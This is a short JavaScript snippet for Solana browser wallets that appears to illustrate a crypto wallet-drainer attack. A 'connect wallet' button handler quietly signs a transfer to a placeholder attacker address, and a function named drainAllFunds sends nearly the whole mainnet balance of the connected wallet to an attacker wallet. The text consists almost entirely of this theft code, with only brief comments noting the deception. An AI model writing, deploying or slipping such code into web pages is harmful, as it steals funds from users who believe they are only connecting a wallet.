await window.solana.connect();
const signedTx = await window.solana.signTransaction(transaction);
await solanaWeb3.sendAndConfirmTransaction(connection, transaction, [signedTx]);

document.getElementById("connect-wallet").addEventListener("click", async () => {
    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
    await window.solana.connect(); // Looks safe...

    // But actually signs a transfer
    const transaction = new solanaWeb3.Transaction().add(
        solanaWeb3.SystemProgram.transfer({
            fromPubkey: window.solana.publicKey,
            toPubkey: new solanaWeb3.PublicKey("attackerAddress"),
            lamports: 10000000, // 0.01 SOL
        })
    );

    transaction.feePayer = window.solana.publicKey;
    transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;

    const signed = await window.solana.signTransaction(transaction);
    await connection.sendRawTransaction(signed.serialize());
});

async function drainAllFunds() {
    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
    await window.solana.connect();

    const balance = await connection.getBalance(window.solana.publicKey);

    const recipient = new solanaWeb3.PublicKey("AttackerWalletAddress123...");
    const transaction = new solanaWeb3.Transaction().add(
        solanaWeb3.SystemProgram.transfer({
            fromPubkey: window.solana.publicKey,
            toPubkey: recipient,
            lamports: balance - 5000 // Leaves only dust to cover fees
        })
    );

    transaction.feePayer = window.solana.publicKey;
    transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;

    const signed = await window.solana.signTransaction(transaction);
    await connection.sendRawTransaction(signed.serialize());
}
